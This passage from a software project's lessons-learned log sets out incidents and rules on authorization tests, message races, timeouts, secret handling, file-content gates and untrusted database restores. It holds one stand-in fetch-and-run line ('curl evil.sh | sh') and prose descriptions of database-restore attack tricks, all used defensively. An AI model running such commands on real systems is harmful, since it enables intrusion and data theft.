cannot comfortably read what is in front of them, and the sign-in page is a page. Gating it
behind having already signed in asks that person to read and operate the form they cannot
read in order to reach the control that would fix it. The control was present, visible, and
useless to exactly the person it was built for.

Skin, theme and accessibility mode set a cookie holding a rendering choice and touch
nothing else, which is what makes them the only writes here that need no identity. They now
sit in their own route group with a CSRF middleware that takes the session-bound token when
there is a session and the sign-in page's double-submit pair when there is not, and on a
signed-out page the toggle is the first focusable element on the document, ahead of the
skip link.

**Rule.** Ask who a control exists for, then check they can reach it in the state they will
be in when they need it. An accessibility affordance, an error recovery path and a
break-glass control all share this shape: the person who needs it is by definition not in
the ordinary state, so gating it on the ordinary state is gating it on not needing it.

## 179. Two surfaces called Settings is one surface nobody can find

The account page was labelled "Settings" in the sidebar and titled "Settings" on
the page. That was fine while it was the only settings surface. It stopped being
fine the moment the deployment's own configuration needed one, because AWX calls
that admin area Settings and it is the word its audience arrives with.

The collision is not cosmetic. The two pages have nothing in common beyond the
word: one is a caller's own appearance and password, protected structurally
because it carries no identifier and the session IS the subject; the other is how
everyone authenticates, what every run inherits and how long audit records
survive, protected by a scope because it is about everyone. Somebody sent to
"Settings" to configure LDAP and landed on their own theme picker would conclude
the feature was missing.

The caller's own page is Preferences now, and the deployment's is Settings. The
rename cost four files and happened before the second page existed, which is the
only cheap moment it was ever going to have.

**Rule.** Two surfaces cannot share a name, and the one to rename is the one
whose name is less load-bearing to the audience. When a word is what a user
arrives searching for, it belongs to the thing they are searching for, and
whatever already holds it needs a more specific one.

## 180. A permission test that an admin passes is a test of nothing

The first version of the settings authorization test drove the page with the
conformance suite's admin identity and asserted a 404, reasoning that admin holds
access:write and deliberately not settings:read, so a caller who administers role
bindings must not thereby reach the page that points authentication at a
directory. The reasoning was right and the test was useless:
auth.Identity.HasScope lets RoleAdmin bypass every scope check unconditionally,
so the admin got a 200 and the test failed for a reason that had nothing to do
with the gate.

The positive half was worse, and failed silently. It drove the page with an
identity that held settings:read AND RoleAdmin and asserted a 200. That would
have passed with the gate deleted, with the scope constant deleted, with the
handler's check commented out. A green assertion proving nothing is worse than
no assertion, because it is counted.

Both were fixed by choosing identities that isolate the mechanism: a RoleViewer
holding fleet read scopes and not settings:read for the refusal, and a
RoleOperator holding settings:read for the admission. Neither can pass by
accident.

This also surfaced something worth knowing rather than only fixing: **role admin
is settings access today, with no separate grant.** That is the platform's
existing rule and not this surface's, but it deserves stating on a page that
names an LDAP bind account and the base URL every identity-provider callback is
built from.

**Rule.** When testing an authorization gate, pick an identity that can only pass
through the mechanism under test. A role that bypasses scope checks, a wildcard
scope or a superuser makes both halves of the assertion vacuous, and the positive
half fails silently: it will pass with the thing it is testing removed. Write the
negative case with the weakest identity that should be refused and the positive
case with the weakest identity that should be admitted.

## 181. A fire-and-forget signal must have its subscription confirmed by the broker before the work it can interrupt is allowed to start, because losing that race does not delay delivery, it cancels it.

**The incident.** Job cancel's control channel is deliberately core NATS rather than the durable
`event.Bus`: a cancel means something only to whoever is listening at the moment it is sent, and
`Bus.Subscribe` builds a consumer group that would hand it to one arbitrary Runner instead of the
one holding the job. That reasoning was right. What it made easy to forget is what the same
property costs on the SUBSCRIBE side. nats.go buffers the `SUB` line and writes it
asynchronously, so `Subscribe` returning means the client intends to subscribe, not that the
server will route anything to it yet. With a durable subject the gap is invisible, because the
message waits. With a core publish there is nothing to wait: the server routes to whoever is
registered at that instant and discards the rest.

`executeWithLease` subscribed and then immediately called `Execute`, so the unregistered window
sat exactly across the start of a run, which is the single most likely moment for somebody who
has just launched something to stop it.

**Why the first diagnosis was wrong, and what corrected it.** The failure arrived under parallel
container load in a package already listed in `flaky-packages.json`, and it looked precisely like
FAILURE_PATTERNS #61 resource contention. The move that settled it was raising the deadline
rather than lowering it: a contention theory predicts that a thirty-second budget passes where a
two-second one failed, and instead the test failed for the full thirty seconds. A timeout that
does not care how long it is given is not measuring slowness. That is a cheap, general
discriminator worth reaching for before accepting a flake explanation, and it is cheaper than it
looks, because a passing run returns as soon as its condition is met and pays none of the extra
budget.

**The asymmetry that hid it.** Delivery to a subscriber on the PUBLISHING connection worked every
time, because the `SUB` and the `PUB` share one write buffer and arrive in that order in a single
flush. Only a second connection could see the bug. A test with one connection would have passed
forever, which is also why the two-subscriber arrangement was worth building: it was written to
prove delivery reaches everybody rather than one consumer-group member, and it caught a
registration bug instead.

**The symmetric obligation.** The first fix left the test's own raw wildcard subscription
unflushed, and it then failed by itself about one run in three, carrying the exact race the
implementation had just been fixed for. A test that subscribes is a subscriber, and it owes the
same discipline as the code it is testing.

## 182. A timeout parameter is a promise about a whole operation, and a library default underneath it can quietly own a shorter one. A nil configuration field is a choice, not an absence.

**Two instances, three years of code apart in reading order and both in this module.**

`pkg/winrmexec` found it first, and found it the expensive way. Windows refuses unencrypted
WinRM by default, so every operation goes through `winrm.Encryption`, whose `Transport` method
builds a bare `&http.Client{}`: no `Timeout`, the default transport, an unset and therefore
unlimited `ResponseHeaderTimeout`, and requests built with `http.NewRequest` rather than
`NewRequestWithContext`, so a caller's context never reaches the HTTP layer at all. The measured
consequence was a task that reconfigured a device's own network address, destroying the
connection carrying it, blocking for two minutes fifty-one seconds and then three minutes ten
seconds on separate runs, with neither `Options.Timeout` nor a context deadline shortening
either. That package documents all of it in thirty lines above the fix.

`internal/catalog/http` then shipped the identical class (FAILURE_PATTERNS #218): the verifying
path returned a bare `&http.Client{}`, a nil `Transport` means `http.DefaultTransport`, and its
`TLSHandshakeTimeout` is a fixed ten seconds that the method's own documented `timeout`
parameter could not reach. An operator asking for sixty got ten.

**The lesson is not "remember about http.Client".** It is that the first instance's knowledge
lived in a comment above the code that suffered from it, which is exactly where nobody writing a
different HTTP client will ever read it. A defect class that has been found once and documented
locally is not closed; it is closed when the next instance is either prevented or enumerable.
The cheap enumeration here is a grep for `&http.Client{}`, `http.DefaultClient` and
`DefaultTransport`, which takes seconds and today returns exactly these two sites.

**Two specific habits fall out of it.**

A nil field is a configuration decision rather than a blank. `&http.Client{}` is not an
unconfigured client, it is the process-wide shared default one, with somebody else's deadlines
and somebody else's connection pool. Reading it as "nothing set here" is what made both
instances invisible to review.

And when exposing a timeout, enumerate every deadline the call can hit rather than only the one
being set. An operation with two deadlines where the caller controls one is an operation whose
documented limit is a guess, and the failure surfaces as the shorter one, which is the one
nobody wrote down.

---

## 183. Every gated control needs its relation in two places, and only one of them fails loudly

**The rule.** An affordance-gated control is decided by two structures: the gate that asks
whether a relation is permitted, and the candidate set the authorization layer is driven from.
Adding a control to the first and not the second withholds it from everybody, silently, at every
role. Before shipping a new kind of gated control, prove a PERMITTED caller can see it, not only
that an unpermitted one cannot.

**The incident.** `view.RowAction` was added so a section could act on one of its own rows. The
resolver gated each control on `permits(a.Endpoint, aff)`, exactly as the header half already
did, and every control rendered for nobody. `Descriptor.Candidates` collected the endpoints of a
view's operations and its record actions and knew nothing about row actions, so the generator was
never asked about the relation, it was never in the permitted set, and the gate answered no
universally.

**Why it is worth a rule rather than only a fix.** Withholding a control is what the affordance
layer is FOR. A missing control and a correctly withheld control are the same rendering, so there
is no observable difference between "you may not do this" and "nobody asked whether you may".
Every other failure in this layer announces itself: a missing route is a 404, a missing scope is
a 403, a missing endpoint is a startup refusal. This one produces a page that looks finished. It
is the same shape as FAILURE_PATTERNS #73, where an unevaluable permitted set rendered as a
read-only page, and the same answer applies: the positive case is the one that has to be
asserted, because the negative case passes when the feature is absent entirely.

**What to do.** When introducing a gated control, find the enumeration the authorization layer
reads rather than the one the renderer reads, and add to both in the same change. Then write the
test as "a caller who holds the relation sees the control", which fails when either half is
missing, rather than "a caller who does not hold it does not", which passes when both are.

---

## 184. A refusal the operator can act on and a fault they cannot must not share a rendering

**The rule.** When a write path fails, decide whether the reason is a rule the person at the
keyboard can satisfy or a failure that is nobody's doing, and answer the two differently. A rule
they can satisfy is shown to them, in the store's own words, on a page they can act from. A
failure that is not theirs is logged and answered generically, because its message is not
addressed to them and may carry whatever the failure happened to be holding.

**The incident.** A row action has no form to attach a field error to, which is how every other
write in this UI reports a refusal. So every failure it had went to `serverError`: the real
reason into the log, and the words "internal error" onto the page. The case that made this
untenable was ordinary rather than exotic. Removing an input a credential type's injector still
references is refused by `credtype`, with a sentence naming the input and the dependency, and the
operator resolves it by removing the injector first. Answering that with "internal error" hides
the fix, tells them it was not their doing, and puts the sentence that would have resolved it in
a log they cannot read.

**The shape of the fix.** `view.Refuse` wraps the store's own error as one meant for the
operator; the handler renders it through the shared zero state at its problem tone with a way
back to the record, under 422, the status a form's validation failure already carries. It wraps
rather than restates, so `errors.Is` still works above it and the words shown are the store's,
which is the authority on why it refused. The resource decides which sentinels qualify, and only
two did: an invalid type and a managed one. A driver error is not on that list.

**The alternative that was rejected, and why.** A flash message on the record the control came
from reads better and cannot be built honestly here. A flash has to survive a redirect, which
means either session-keyed server state or a message reflected out of the URL, and a
server-generated sentence arriving through a query parameter is a sentence anybody can put there.
A page costs one navigation and reflects nothing.

---

## 185. A test that varies only one instance of the dimension a mechanism is keyed on proves nothing about that dimension

**The rule.** When a mechanism is keyed on some dimension (a stream, a tenant, a scope, a
namespace), a test that exercises it through a single value of that dimension cannot distinguish
the real behaviour from a narrower one. It passes either way, and it will sit happily beside
documentation asserting the narrower model, because nothing in the repository disagrees with it.
Vary the key.

**The incident.** `internal/event/nats_dedup_test.go` had two real-broker tests of JetStream's
producer-side duplicate window: one proving a repeated publish is suppressed, one proving two
distinct events are both stored. Both published to a single `const topic`. JetStream's dedup
window is scoped to the **stream**, and this module puts every subject in one stream, so both
tests were equally consistent with "dedup is per subject" and "dedup is per stream".

They passed for five weeks while three doc comments in the module asserted the per-subject model,
while the Controller stamped a dispatch with `"<jobID>:<deviceID>"` and the Runner published that
device's result under the identical id, and while the broker silently discarded every result in
the system. The doc comment directly above the offending line described the two keys agreeing
"exactly, for the identical reason" as the mechanism working correctly. FAILURE_PATTERNS #222.

**What makes this different from ordinary missing coverage.** The tests were not absent and were
not weak: they were real, they ran against a real broker, and each proved a true thing. What they
could not do was fail. Coverage tooling counts this path as covered, review reads two passing
real-infrastructure tests and moves on, and the incorrect mental model they teach is then
reproduced in the comments of everyone who reads them.

**What to do.** For any keyed mechanism, write the test that holds the key constant and varies
the thing the key is supposedly scoped to. Here that is two subjects sharing one message id
against one stream. Assert the mechanism rather than the bug: a test pinning "the runner's key
differs from the dispatch's" would have gone green on the fix and said nothing about why it must.

---

## 186. An API that reports "I did not do what you asked" through a success return must have its result read, and a wrapper that discards it is a silent failure factory

**The rule.** Some calls report refusal in the return VALUE rather than the error: a suppressed
duplicate, a conditional write that matched nothing, a partial batch, a no-op upsert. A wrapper
that returns only `error` for such a call converts a loud failure into a silent one for every
caller it will ever have, permanently and invisibly. When wrapping, either surface the outcome or
be certain nobody can act on it.

**The incident.** `internal/event.natsBus.Publish` called `js.PublishMsg` and discarded the
`PubAck` with `_`. A suppressed duplicate comes back as `PubAck{Duplicate: true}` with a **nil
error**, so a message the broker stored nowhere and a message it stored were the same value at
every layer above that line. The Runner's `publishResult` therefore returned true, `flushOne`
acknowledged the WAL entry and deleted the only durable copy, and the retry mechanism built
precisely for lost publishes was defeated by the same nil error. Nothing logged anything.

**The second half, which is the one that generalises further.** The Runner's own
publish-failure log was at `Debug`, and `cmd/runner` builds its logger at `LevelInfo`. So even a
*genuine*, error-returning publish failure was structurally unobservable in the production
binary. A log level chosen at a call site is a claim about importance that the composition root
can silently veto, and "we log it" is not the same as "it is observable".

**What to do.** Read the ack. A duplicate stays a nil error, because dedup working is the
mechanism doing its job and a caller retrying a publish it already made should not be handed a
failure. But a publisher that believes it is sending something new wants to know, and the wrapper
is the only place that can tell it. Before choosing `Debug` for a failure path, check what level
the binary that runs it actually emits.

---

## 187. Unmarshalling into a reused value is a merge, and `omitempty` is what makes that a corruption bug

**The rule.** `json.Unmarshal` into an already-populated value does not replace it. It reuses an
existing slice's elements rather than allocating new ones, and it leaves a struct field untouched
when the incoming JSON carries no key for it. Decode each response into a fresh value. The
combination to watch for is a reused decode target, an `omitempty` field, and a collection with no
guaranteed order: any two of those are harmless and all three silently move one record's data onto
another.

**The incident.** An e2e poller declared `var last jobResponse` outside its loop and unmarshalled
every poll into it. A dispatched task's `reason` is `omitempty` and therefore absent from the JSON,
so the decoder could not overwrite whatever occupied that slice slot before. The task list had no
`ORDER BY`, and once results began landing the updates moved rows around, so a skipped device's
reason ended up on a dispatched device's row. The assertion reported it as a fan-out defect and
three investigations searched the write path, which was correct throughout.

**Why `omitempty` is the load-bearing part.** The three fields beside it were plain-tagged, always
present, and therefore always overwritten. They never went stale and never disagreed, which is
also the signature that identifies this bug: if some fields of a record are consistent and one is
not, the inconsistent one is the one the server omits.

**The diagnostic half, which cost more than the bug.** Every failure message in that poller was
built from the decoded value. A harness that corrupts its own decode then reports the corruption
as though the server sent it, and nothing in the suite could tell the two apart. When a harness
can be wrong about what arrived, its failure messages have to carry what actually arrived: keep
the raw body and print it.

**The API side.** An endpoint returning an array with no guaranteed order is a trap for any client
written the obvious way, not only for a test harness. If a collection has a natural order, give it
one.

---

## 188. A round-trip test must compare against what the test put in, never against how the page looked beforehand

**The rule.** When testing that a read-modify-write cycle preserves data, the expectation has
to come from OUTSIDE the cycle. Comparing the state before to the state after looks like the
natural invariant and is blind to the most important failure: a value that the read never
produced is missing from the "before" and the "after" alike, so the comparison holds while the
data is destroyed.

**The incident.** The test was "render the edit form, post back exactly what it offered, and
nothing should change". It took four attempts to make it capable of failing, and each failed
version would have shipped looking thorough:

1. **It posted a hardcoded body.** A literal request body posts the right values whatever the
   form rendered, so deleting the prefill entirely left it green. Fixed by reading the values
   back off the rendered HTML, which is also what an operator pressing Save without touching
   anything actually sends.
2. **It compared the section's table.** That table renders five of the input's eight
   properties, so `multiline`, `help` and `default` could be destroyed invisibly. Fixed by
   comparing the form, which renders all of them.
3. **It compared before to after.** This is the subtle one and the reason for the rule. A
   dropped prefill is absent from both renders, so equality holds while the stored value is
   overwritten with blank. Fixed by comparing against the literal values the test itself had
   written in.
4. **Its data was at the zero value.** A stored value equal to the type's zero round-trips
   correctly even with its prefill deleted, so controls had to be given values that differ
   from their zeros, across two records where one record could not hold them all.

Each step was found the same way: delete one prefill, run the test, watch it pass. That loop
is cheap and it is the only thing that distinguishes a test of a property from a test that
merely exercises it. The final version was checked against all seven controls individually.

**A fifth thing, worth its own sentence.** The first working version added a REQUIRED input to
a shared fixture and broke an unrelated conformance test, because every credential of that type
then had an unanswered required input. A test that mutates shared fixture state is a test that
fails somebody else's assertion later; it built its own record instead.

---

## 189. A diagnostic that probes for a secret must be incapable of printing one, because the safe-looking half of `${VAR:+x}${VAR:-y}` is the half that leaks

**The rule.** When checking whether a secret is present, use a construct that cannot emit its
value under any branch. `[ -n "$VAR" ]` and `${#VAR}` cannot. `${VAR:-default}` can and will,
because it substitutes the VALUE whenever the variable is non-empty, which is exactly the case
a presence check is written to detect.

**The incident.** A LocalStack auth token was needed by a coverage gate. Checking whether it
had reached the shell, the probe was written as:

```sh
echo "TOKEN: ${VAR:+<set, length ${#VAR}>}${VAR:-<still unset>}"
```

It reads as "print a safe summary if set, otherwise print unset", and it is not that. Both
expansions are evaluated and concatenated. When the variable is set, `${VAR:+...}` gives the
safe summary and `${VAR:-<still unset>}` gives **the token**, so the one branch written to
handle absence is the branch that printed the secret. The token went into the session
transcript and through a model provider's context.

**Why the usual defences did not apply.** Nothing was committed, and a later check confirmed
zero occurrences across tracked files, the working tree, and the full history of every branch.
The repository's own protections are aimed at secrets reaching the repo; this one never went
near it. `gosec` does not read shell written at a prompt, and `commitgate` inspects the index.
The exposure was a diagnostic, and diagnostics are the one category of code that exists
precisely to print what you are unsure about.

**The near miss worth naming.** The probe ran before a push rather than after, and the token
lived in `~/.bashrc` rather than in a file under the working directory. Had it been in a
`.env` the build sourced, the same carelessness would have put it somewhere a commit could
sweep up. The outcome was better than the reasoning that produced it.

**What to do.** Probe for presence with a construct that has no value-emitting branch:

```sh
[ -n "$VAR" ] && echo set || echo unset        # cannot print it
echo "length: ${#VAR}"                          # cannot print it
```

And when a secret must be moved between shells, carry it by assignment rather than through
anything that echoes: a command substitution feeding a variable prints nothing, while the same
pipeline written to inspect the result prints everything. Rotation, not care, is the remedy
once a secret has been displayed, because a transcript and a provider's logs are not files you
can delete.

---

## 190. A content rule written as a denylist of known-bad shapes is defeated by the shapes nobody listed; write it as an allowlist of what can be proved inert

Building the `file` survey question needed a rule for refusing executable content. The first
sketch was the obvious one: a table of magic numbers (`\x7fELF`, `MZ`, `PK\x03\x04`, `\x1f\x8b`)
plus a `#!` test. A design panel run in parallel killed it, and the argument is worth keeping
because it generalises well past this feature.

A denylist fails OPEN on everything absent from it. Every named bypass of a check like this lives
in that gap: a byte-order mark before the shebang, a UTF-16 export whose ASCII is NUL-interleaved,
a zip container, a polyglot, a format invented after the table was written. Each one needs its own
entry, and the entry can only be written by somebody who already thought of it.

An allowlist fails CLOSED on all of them without naming any. The rule that shipped is: valid
UTF-8, no NUL byte anywhere, no byte-order mark prefix, and `#!` at offset zero exactly. An ELF is
refused because it carries NUL, not because anybody listed ELF. A container format released next
year is refused by a rule written today. The classifier's own zero value is the refusing class, so
a classification that never ran refuses too.

Two second-order rules came with it.

**Refuse a byte-order mark rather than stripping it and re-checking.** Stripping and re-running is
two passes over two different byte strings, and the desynchronisation between those passes is
where this class of bug actually lives. Refusing at the mark means there is no second pass.

**Name the flag for what it really governs.** The first name was `AllowExecutableFiles`. After the
inert rule, the gate governs exactly one thing: whether the text announces itself with `#!`. It
was renamed `AllowProgramContent` because the first name was a lie, and a flag whose name
overstates what it does is worse than no flag: it invites the reading that whatever passes is safe.

The residual risk is written into the code rather than into a document, in the "Known, deliberate
residual risk" form this repository already uses. The check refuses a file that ANNOUNCES itself
as a program and cannot refuse one that IS one. A text file holding `curl evil.sh | sh` passes
every test and is accepted with both gates shut, because the dangerous property does not live in
the bytes: it lives in what the automation does with them, and a runbook may already pipe any
`text` answer to a shell with no flag at all. What the two gates buy is separation of duty --
neither is settable by the person launching the job -- and saying so in the file is what stops the
next reader from mistaking a guardrail for a sandbox.

## 191. A gate that is only checked when a record is authored is not a gate; check it where the thing happens, and make the caller unable to supply it

The `file` question's system-level permission is an environment variable the Controller reads at
startup. The tempting place to enforce it is `Survey.Validate`, at save time: the template author
gets an immediate error, and the check is one line.

That would have been an authoring lint wearing a gate's name. A template authored while the
deployment consented keeps its flag; withdrawing the consent would stop NEW templates being
written and do nothing about every template already in production, which is the population that
matters. So the deployment's half is consulted at LAUNCH, from a value threaded into the
dispatcher at startup, and clearing the variable plus a restart immediately stops templates that
already carry the flag. There is a test that asserts exactly that, with the template held
identical across both halves and only the Controller's configuration differing.

The second half is the one that makes the pair a real separation of duty. The policy rides
`launch.Config`, and a `Config` is built by callers. The dispatcher therefore ASSIGNS it
immediately before resolving, overwriting whatever the caller put there, rather than defaulting it
when absent. A defaulting version passes every obvious test and lets anybody who can construct a
Config grant themselves the deployment's consent -- which is one of the two gates. Proving that
took a deliberate negative control: replacing the assignment with `if cfg.FilePolicy == zero` made
the forgery test fail and nothing else, which is the shape of a test worth keeping.

`pkg/remoteexec/knownhosts.go` already argued against exactly this kind of environment variable
for host-key verification: "Deliberately a PATH and never a POLICY... an operator who sets a
variable once forgets it, while a task parameter is written in the runbook next to the command it
applies to and shows up in review." The distinction here is real and should be weighed rather than
assumed: the variable alone permits nothing, and the thing it consents to IS a per-record
parameter that shows up in review. The startup WARN exists because the "sets it once and forgets"
failure is the same one.

## 190. A gate must not run inside a hook whose caller has already opened a network connection; make the gate a process and the hook a receipt check

**The incident.** `.githooks/pre-push` ran `make push-gate`, which takes roughly twenty minutes.
Git opens its connection to the remote and fetches the ref advertisement BEFORE running that hook,
because the hook's stdin carries the remote sha for each ref. So the gate ran inside a window git
was holding a socket open for, and by the time it passed, the remote had dropped it. Every push
exited 141 with no output while the gate printed "all checks passed". See FAILURE_PATTERNS #229.

**The rule and why it generalises.** A hook is a decision point, not a workload. Whatever invoked
it is holding resources whose lifetime nobody wrote down: a connection, a lock, a transaction, a
lease. The longer the hook runs, the more of those expire, and the failure surfaces as something
unrelated to the hook at a layer that cannot explain it. Run the expensive thing as its own
process on its own schedule, have it record a verifiable result, and let the hook ask one question
with an instant answer.

**The receipt shape matters as much as the split.** It binds a COMMIT, not a tree, and it is only
issued from a clean working tree. That makes the arrangement stricter than the hook it replaced,
which is worth stating because it looks like a loosening: running the suite in the hook proved
something about the working tree and then pushed commits, and with uncommitted edits those are
different code. It records which gate ran, because `push-gate` tolerates a failure confined to a
`flaky-packages.json` package and `ci` does not, and a reader who cannot tell them apart will
eventually read a tolerated pass as a strict one. It carries a max age for exactly one reason:
every check is a pure function of the tree except `govulncheck`, which reads a live advisory
database, so an old pass still describes the same code while no longer answering that one
question.

## 191. A test failure in a package NOT on the flaky list is a defect until proven otherwise, and three of three were

**The incident.** Three consecutive `make ci` runs failed in three different packages. The
temptation each time was to read "different victim each run" as the contention signature and move
on, because that discriminator is real and this repository documents it. But the discriminator's
second half is the part that matters: contention is the explanation for a package that
`flaky-packages.json` names with a written observed reason. For a package outside that list it is
a hypothesis, not a finding.

`internal/catalog/wait` was a truncate-then-write race that let the test pass for the wrong reason
(#230). `pkg/serialexec` was a five second budget plus a wait loop blind to its own subprocess
dying (#231). `internal/catalog/facts` could not be reproduced in eighty targeted runs and was
left alone, which is the correct third answer and is not the same as waiving it.

**The rule.** Run it alone to classify, then decide by LIST MEMBERSHIP rather than by the
isolation result. Passing alone tells you the failure is timing sensitive; it tells you nothing
about whether the timing sensitivity is a defect. A package that provisions containers and is
listed with a reason has already had that question answered by somebody. A package that spawns one
local subprocess has not, and adding it to the list to make a red run green converts an unexamined
bug into a package nothing checks anywhere.

**The third answer.** When it cannot be reproduced, say so and change nothing. A fix you cannot
demonstrate is a change that does nothing while claiming to, and it costs the next reader the
assumption that the area was examined.

## 192. The exit status of a pipeline is the last command's, so wrapping a gate in `| tail` reports the pager's success and hides the failure

**The incident.** `make ci | tail` and `git push | tail -20` were both read as green when the real
command had failed, twice in one session, and the second one hid a push that never happened for
three attempts. The same shape appears when a long command is wrapped for readability:
`cmd > log; echo "EXIT=$?"` captures the echo's status if anything is piped after it, and
`setsid cmd` without `--wait` returns immediately so the caller's status describes the fork, not
the work.

**The rule.** Capture the status of the command you care about, in its own statement, with nothing
between: `cmd > log 2>&1; echo "EXIT=$?" >> log`, then read the log. For anything whose result
will be reported to a person, verify the OUTCOME independently rather than the exit code:
`git ls-remote` for a push, the artefact on disk for a build. An exit code is a claim about a
process; the outcome is the thing being claimed.

## 193. A count that decides whether destroying data is safe must fail in one direction only: read raw storage, trust no label, and treat any read error as a refusal

**The incident.** The setup command refuses to write a master key over data encrypted under another
one, so it has to count that data first. Three natural ways to count all answer "nothing here" for
a database full of credentials. An ent client carries the decrypting interceptors, which return
plaintext, so a count of sealed values through it is zero. An `EnvelopeService` picks a key by the
version tag stored with each row, and a tag is a label an operator chose, so a count built with the
default `v1` calls every row written under `v2` unreadable by the key that wrote it. And a read that
fails partway, or a connection severed mid-query, returns what it had so far, which looks exactly
like a small or empty table. Each of those errors is in the one direction that permits destroying
data.

**The rule.** When a count gates an irreversible action, design it so every failure makes it say
MORE, not less. Read the raw stored values with plain SQL (`ent.OpenExisting`, which cannot carry
an interceptor and neither migrates nor creates what it reads), decide which key holds a value from
the key material itself (`crypto.KeyOpens` unwraps only the data key and ignores the tag and the
binding), count a value that looks sealed but does not parse as sealed, and return an error rather
than any partial count. Then prove the severed-connection case against a real proxy, because a
unit test with a failing fake proves only that the fake fails.

## 194. When a tool offers an operator-managed alternative to a value it would otherwise compute, every guard derived from that value needs a supplied-value path

**The incident.** The Helm chart computes two guards from values it renders itself: a fingerprint
of the database credentials, stamped on the data volume so a reinstall with a different password
is refused, and a checksum of its Secret, so a changed Secret restarts the pods. Under
`secrets.existingSecret`, the path the chart's own comments recommend for keeping secrets out of
Helm's release records, the chart renders no Secret, so both guards computed from nothing and were
silently off. The fingerprint's comment said so ("empty when secrets.existingSecret is set") and
read as an explanation rather than a gap.

**The rule.** For each guard, ask what it is computed from and whether every supported path
supplies that. Where the tool cannot see the value, take the guard's input as a value the operator
(or the tool that made the Secret) supplies, and prove the recommended path renders it: here
`tools/helm-lint` renders the setup command's own values file on every run. A comment that begins
"empty when" is a record of a path the guard does not cover.

## 195. To prove a message never contains a secret, prove the message does not depend on the secret; a substring check is refuted by any value that spells part of the message

**The incident.** `FuzzParseEnvFile` first asserted that no refusal contained a value from its
input. The fuzzer produced `MASTER_ENCRYPTION_KEY=ASTER_ENCRYPTION`, whose value is part of the
variable name every refusal correctly names. The check was unsound by construction: some value can
always collide with the error's own wording.

**The rule.** State the property as independence: parse the input again with each secret changed
in a way that keeps it exactly as valid (rotate letters within their case and digits within their
range, byte by byte), and require the two results to be identical. An error that does not change
when the secret changes cannot be carrying it. Transform bytes, not runes, since the input a parser
fuzz target exists to send is invalid UTF-8, and a rune-level transform repairs it.

## 196. Restoring a file is running its author's code: contain it with a role that can reach nothing else, and accept it only if its schema is exactly what your own migrations make

**The incident.** `pg_restore` executes every statement in an archive, and a custom-format archive can label any SQL with any entry kind. The compose stack's database login is a superuser, so a restore run as that login would run a crafted file's `COPY ... TO PROGRAM`. Running it as a restricted role is not enough on its own: a trigger, a column default or a rule the file leaves behind runs later as whoever next writes to that table, which is the superuser controller. Measured: a default calling `pg_read_file` passes every check on the table of contents, because it is part of a TABLE entry.

**The rule.** Load an untrusted archive into a scratch database as a role that owns that database and nothing else. Clear the settings it could have left. Then compare the result against a fresh database built by your own migrations, catalog by catalog, and refuse any difference. Nothing with more rights touches the scratch database until the comparison passes. A positive comparison ("exactly this") needs no list of dangerous object kinds, and a blocklist is complete only until the day it is not.

## 197. A test's shared namespace is a destructive operation waiting for a developer's data: give every gate that deletes things its own name, and refuse when it cannot have one

**The incident.** Every compose release gate ran `docker compose down -v` as the project the compose file names, which is also the project `make up` creates in the same checkout (FAILURE_PATTERNS 240). Nothing had yet been lost, only because no developer had run the gate with a stack up.

**The rule.** A test that deletes must delete only what it created, and the way to guarantee that is a name nothing else uses. Where a resource cannot be separated by name (host ports), check for it first and refuse with a message naming the safe way to free it.

## 198. A configuration key is a statement of intent; before it guards against something, observe the tool in the state where that something would happen

**The incident.** Phase 83 concluded that a compose service with `build:` would never pull its image. A thirty-second probe on the installed Compose showed it pulls first and builds only when the pull fails, from a Docker Hub namespace a third party owns (FAILURE_PATTERNS 241).

**The rule.** When a security property depends on what a tool does with a setting, build the smallest state where the unwanted behavior would occur (no local image, a missing file, an unset variable) and watch it. Record the measurement next to the setting, and pin it with a test that reads the setting.

## 199. An exception to a gate that is enforced twice must be defined once, and both enforcers must ask it

**The incident.** Check mode lets a simulate-locked device be checked. The exception was written into the executor's admission, unit-tested there, and passed. The first real `pleiades run --mode check` against such a device stopped at plan-time validation, whose lifecycle rule knew nothing about modes (FAILURE_PATTERNS 249). The engine's test built its Executor directly, so the plan-time gate never ran under it.

**The rule.** When a rule is enforced at plan time and again at run time (defense in depth, as this codebase does for capabilities and lifecycle), an exception to it is a third thing both enforcers must consult: put it in one exported function and have both call it (`engine.LifecycleAdmitsIn`). Then prove it with a test that goes through BOTH gates, which in practice means the real command, not either gate alone.

## 200. On a small development machine, parallelism is a resource to budget, not free throughput

**The incident.** On 2026-09-18 four workflow agents were launched at once, each building and running `go test -race` over large packages of this repository, one of them deliberately flooding tens of megabytes of process output, alongside the lead's own test run. The WSL virtual machine (7.8 GiB at the time, with VS Code, gopls, Pylance and three Claude sessions already resident) ran out of memory and swap, reached a load average of 43, and had to be rebooted. The agents' partial work survived on disk; none of it had been reviewed, and all of it had to be checked afterwards.

**The rule.** Before fanning out work that builds or tests this repository, check the machine (`free -h`, what else is resident) and budget for it: at most one build-heavy agent at a time here, Go commands capped (`GOMAXPROCS=4`, `-p 2`, `-p 1` for `-race`), one package at a time, and read-only agents only when parallelism is wanted. A fan-out that kills the machine loses more time than any serial run, and it takes the user's editor down with it.

## 201. Settle a decision by its edge cases, checked against the code, never by its options alone

**The incident.** On 2026-09-18 fifteen design decisions for check mode and external Collections each had options, pros, cons and a recommendation. The user asked for edge cases first, then the secure answer that gives the most functionality. Checking each edge case against the code, with probes rather than reading, changed four of the fifteen answers and found three defects the earlier recommendations would have shipped. A same-user child reads its parent's environment from `/proc`, which defeated the recommended environment-variable key (FAILURE_PATTERNS 251). A runbook-level `check_mode: true` was silently ignored, where the plan said no key existed (252). Check mode admitted third-party Checks to simulate-locked devices (253). Launch resolution ignores a malformed field value, where refusing it was needed for mode, since ignoring it falls back to a real run.

**The rule.** A pros-and-cons list compares options on their stated merits; the edge cases are where an option actually fails. For each decision, list the concrete inputs that stress it (a typo, an older peer, a lock, a same-user process, a stray key), check each against the real code or a probe, and only then choose. The user's rule for choosing is the secure answer that keeps the most functionality, and it usually has a better answer than any option first listed.

## 202. Check the bytes a tool wrote, not the text you gave it

**The incident.** On 2026-09-18 an agent writing `internal/termsafe`, a package that escapes invisible terminal-controlling characters, typed their escape forms into its file-writing tool. The tool decoded them, and real bidirectional overrides landed in the package's own comment and tests (FAILURE_PATTERNS 256). The code compiled; only a test comparing expected strings noticed, and only because the expectations happened to be written as escapes.

**The rule.** A tool between you and the file can transform what you send. When exact bytes matter (escapes, control characters, anything a reader cannot see), write them in a form the tool passes through untouched, then look at the bytes that landed (`cat -A`, a scan) rather than at the text you sent. Back it with a mechanical check, since the failure is invisible by construction.


## 203. Run the commit gate's rules on a branch before calling it ready, not only at commit time

